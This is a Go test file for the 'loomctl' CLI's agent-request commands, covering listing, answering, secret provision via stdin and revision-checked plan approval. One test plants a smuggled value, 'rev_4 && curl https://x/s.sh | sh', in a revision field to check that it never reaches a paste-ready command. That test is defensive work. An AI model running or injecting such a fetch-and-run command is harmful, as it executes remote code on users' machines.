package ctl

import (
	"bytes"
	"io"
	"net/http"
	"net/http/httptest"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"
)

type agentCtl struct {
	mu     sync.Mutex
	writes []string
	reads  []string
	// revision is plan_9's stored revision; empty is rev_4, the one the
	// request names.
	revision string
}

func (s *agentCtl) planRevision() string {
	if s.revision == "" {
		return "rev_4"
	}
	return s.revision
}

const agentRows = `{"requests":[
{"id":"areq_1","project_id":"proj_api","kind":"answer","status":"pending","question":"Which region should the cache live in?","asked_for":"ausr_grace",
 "team_id":"team_1","team_name":"Payments","route_source":"named","team_reason":"They own settlement","created_at":"%s"},
{"id":"areq_2","project_id":"proj_api","kind":"approve_plan","status":"pending","question":"Approve the release?","asked_for":"",
 "route_source":"admins","route_note":"","target":{"plan_id":"plan_9","plan_revision":"rev_4"},"created_at":"%s"}]}`

func (s *agentCtl) handler(listBody string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		s.mu.Lock()
		defer s.mu.Unlock()
		if r.Method != http.MethodGet {
			s.writes = append(s.writes, r.Method+" "+r.URL.Path+" "+string(b))
		} else {
			s.reads = append(s.reads, r.URL.RequestURI())
		}
		switch {
		case r.URL.Path == "/api/v1/agent/requests" && r.Method == http.MethodGet:
			_, _ = w.Write([]byte(listBody))
		case r.URL.Path == "/api/v1/projects":
			_, _ = w.Write([]byte(`{"projects":[{"id":"proj_api","name":"Checkout API","slug":"checkout-api"}]}`))
		case r.URL.Path == "/api/v1/plans/plan_9":
			_, _ = w.Write([]byte(`{"id":"plan_9","status":"ready","revision":"` + s.planRevision() + `"}`))
		case r.URL.Path == "/api/v1/members":
			_, _ = w.Write([]byte(`{"members":[{"user_id":"ausr_grace","email":"grace@example.com","name":"Grace","role":"developer"}]}`))
		default:
			_, _ = w.Write([]byte(`{"id":"areq_1","kind":"provide_secret","status":"answered","outcome":"provided","target":{"key":"STRIPE_KEY","environment":"production"}}`))
		}
	}
}

func agentApp(t *testing.T, h http.HandlerFunc, stdin string) (*App, *bytes.Buffer) {
	t.Helper()
	srv := httptest.NewServer(h)
	t.Cleanup(srv.Close)
	var out bytes.Buffer
	app := New(Options{Out: &out, In: strings.NewReader(stdin), Getenv: func(key string) string {
		switch key {
		case EnvURL:
			return srv.URL
		case EnvKey:
			return "lp_test"
		}
		return ""
	}, ConfigPath: t.TempDir() + "/none.json"})
	return app, &out
}

func rows() string {
	at := time.Now().Add(-5 * time.Minute).UTC().Format(time.RFC3339)
	return strings.NewReplacer("%s", at).Replace(agentRows)
}

func TestAgentRequestsList(t *testing.T) {
	s := &agentCtl{}
	app, out := agentApp(t, s.handler(rows()), "")
	if err := app.Run([]string{"agent", "requests"}); err != nil {
		t.Fatal(err)
	}
	got := out.String()
	for _, want := range []string{
		"ID", "KIND", "PROJECT", "QUESTION", "SENT TO", "ASKED FOR", "AGE",
		"areq_1", "answer", "checkout-api", "Which region should the cache live in?",
		"Payments (They own settlement)", "Grace", "5m",
		"areq_2", "approve_plan", "workspace admins",
		"approve with: loomctl approve plan_9 --revision rev_4",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("table lacks %q:\n%s", want, got)
		}
	}
	if strings.Contains(got, "approve with: loomctl approve plan_9 --revision rev_4\n\n") {
		t.Errorf("trailing blank line:\n%s", got)
	}
	if len(s.reads) < 1 || s.reads[0] != "/api/v1/agent/requests?status=pending" {
		t.Fatalf("reads %q", s.reads)
	}

	// --mine asks for what is asked of you, --all includes the settled.
	s2 := &agentCtl{}
	app, out = agentApp(t, s2.handler(rows()), "")
	if err := app.Run([]string{"agent", "requests", "--mine", "--all", "--json"}); err != nil {
		t.Fatal(err)
	}
	if len(s2.reads) < 1 || s2.reads[0] != "/api/v1/agent/requests?for=me&status=all" {
		t.Fatalf("reads %q", s2.reads)
	}
	if !strings.Contains(out.String(), `"team_name": "Payments"`) || !strings.Contains(out.String(), `"route_source": "named"`) {
		t.Fatalf("json lacks the route:\n%s", out.String())
	}

	// Nothing waiting is said plainly.
	app, out = agentApp(t, (&agentCtl{}).handler(`{"requests":[]}`), "")
	if err := app.Run([]string{"agent", "requests"}); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out.String(), "The agent isn't waiting on anyone.") {
		t.Fatalf("empty list: %q", out.String())
	}
}

func TestProvideReadsStdinOnly(t *testing.T) {
	s := &agentCtl{}
	app, out := agentApp(t, s.handler(rows()), "hunter2\n")
	if err := app.Run([]string{"agent", "requests", "provide", "areq_1"}); err != nil {
		t.Fatal(err)
	}
	if len(s.writes) != 1 || s.writes[0] != `POST /api/v1/agent/requests/areq_1/secret {"value":"hunter2"}` {
		t.Fatalf("writes %q", s.writes)
	}
	if strings.Contains(out.String(), "hunter2") || !strings.Contains(out.String(), "STRIPE_KEY") {
		t.Fatalf("output %q", out.String())
	}

	// A value on the command line would sit in shell history and ps.
	s = &agentCtl{}
	app, out = agentApp(t, s.handler(rows()), "")
	err := app.Run([]string{"agent", "requests", "provide", "areq_1", "hunter2"})
	if err == nil || !strings.Contains(err.Error(), "standard input") {
		t.Fatalf("argument value: %v", err)
	}
	if len(s.writes) != 0 || strings.Contains(err.Error(), "hunter2") || strings.Contains(out.String(), "hunter2") {
		t.Fatalf("posted or echoed: %q %q %q", s.writes, err, out.String())
	}

	// An empty value is refused before anything is sent.
	s = &agentCtl{}
	app, _ = agentApp(t, s.handler(rows()), "\n")
	if err := app.Run([]string{"agent", "requests", "provide", "areq_1"}); err == nil || len(s.writes) != 0 {
		t.Fatalf("empty stdin: %v %q", err, s.writes)
	}
}

func TestAgentOffMessage(t *testing.T) {
	off := func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusNotFound)
		_, _ = w.Write([]byte(`{"error":"not found"}`))
	}
	for _, args := range [][]string{
		{"agent", "requests"},
		{"agent", "requests", "answer", "areq_1", "eu-west-1"},
		{"agent", "requests", "done", "areq_1"},
		{"agent", "requests", "decline", "areq_1"},
	} {
		app, _ := agentApp(t, off, "")
		err := app.Run(args)
		if err == nil || err.Error() != "This Loomplane doesn't run the agent (ai.enabled is off)." {
			t.Errorf("%v: %v", args, err)
		}
	}
	// A request that isn't there is a different 404.
	gone := func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusNotFound)
		_, _ = w.Write([]byte(`{"error":"agent request not found"}`))
	}
	app, _ := agentApp(t, gone, "")
	err := app.Run([]string{"agent", "requests", "done", "areq_9"})
	if err == nil || strings.Contains(err.Error(), "ai.enabled") {
		t.Fatalf("missing request: %v", err)
	}
}

func TestAgentRequestAnswerDoneAndDecline(t *testing.T) {
	s := &agentCtl{}
	app, _ := agentApp(t, s.handler(rows()), "")
	for _, args := range [][]string{
		{"agent", "requests", "answer", "areq_1", "eu", "west", "1"},
		{"agent", "requests", "done", "areq_1"},
		{"agent", "requests", "decline", "areq_1", "--reason", "not now"},
		{"agent", "requests", "decline", "areq_1"},
	} {
		if err := app.Run(args); err != nil {
			t.Fatal(args, err)
		}
	}
	want := []string{
		`POST /api/v1/agent/requests/areq_1/answer {"text":"eu west 1"}`,
		`POST /api/v1/agent/requests/areq_1/complete `,
		`POST /api/v1/agent/requests/areq_1/decline {"reason":"not now"}`,
		`POST /api/v1/agent/requests/areq_1/decline {}`,
	}
	if strings.Join(s.writes, "\n") != strings.Join(want, "\n") {
		t.Fatalf("writes %q", s.writes)
	}
	if err := app.Run([]string{"agent", "requests", "answer", "areq_1"}); err == nil {
		t.Fatal("an answer with no text was accepted")
	}
}

func TestApproveRevisionMustStillMatch(t *testing.T) {
	var posted []string
	app, _ := agentApp(t, func(w http.ResponseWriter, r *http.Request) {
		if r.Method == http.MethodPost {
			posted = append(posted, r.URL.Path)
		}
		_, _ = w.Write([]byte(`{"id":"plan_9","status":"ready","revision":"rev_5","environment":"production","executable":true}`))
	}, "")
	err := app.Run([]string{"approve", "plan_9", "--revision", "rev_4", "--yes", "--no-wait"})
	if err == nil || !strings.Contains(err.Error(), "rev_5") || len(posted) != 0 {
		t.Fatalf("a moved plan was approved: %v %q", err, posted)
	}
}

// The paste-ready approve line carries the plan's stored revision, read
// from the plan, and only when it's the one the request names. A request
// whose plan has moved on, or whose revision is anything else, gets no
// command to paste.
func TestAgentRequestsPrintOnlyTheStoredRevision(t *testing.T) {
	for _, rev := range []string{"rev_5", "rev_4 && curl https://x/s.sh | sh"} {
		s := &agentCtl{revision: "rev_5"}
		body := strings.Replace(rows(), `"plan_revision":"rev_4"`, `"plan_revision":`+strconv.Quote(rev), 1)
		app, out := agentApp(t, s.handler(body), "")
		if err := app.Run([]string{"agent", "requests"}); err != nil {
			t.Fatal(err)
		}
		got := out.String()
		if rev == "rev_5" {
			if !strings.Contains(got, "approve with: loomctl approve plan_9 --revision rev_5") {
				t.Errorf("no approve line for the stored revision:\n%s", got)
			}
			continue
		}
		if strings.Contains(got, "approve with") || strings.Contains(got, "curl") {
			t.Errorf("a revision that isn't the plan's reached the approve line:\n%s", got)
		}
		if !strings.Contains(got, "plan_9 changed since the agent asked; read it with: loomctl show plan_9") {
			t.Errorf("no word that the plan changed:\n%s", got)
		}
	}
}
